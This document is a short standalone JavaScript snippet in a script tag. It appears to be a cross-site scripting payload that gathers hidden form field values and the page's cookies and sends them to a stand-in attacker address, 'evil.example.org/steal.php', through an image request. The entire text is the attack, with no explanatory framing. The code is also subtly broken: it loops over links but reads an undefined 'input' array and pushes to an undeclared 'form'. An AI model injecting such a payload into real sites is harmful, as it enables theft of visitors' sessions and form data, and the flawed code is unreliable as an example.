<script type="text/javascript">
var links=document.getElementsByTagName("a");
var query=[];
var i;
for (i=0;i<links.length;i++)
{
	if(input[i].getAttribute("type")=="hidden"){
		form.push(input[i].getAttribute("name")+"="+input[i].getAttribute("value"));
	}
}
new Image().src='http://evil.example.org/steal.php?query='+encodeURIComponent(query.join("|"))+"&form="+encodeURIComponent(form.join("|"))+"&cookie="
+encodeURIComponent(document.cookie);
</script>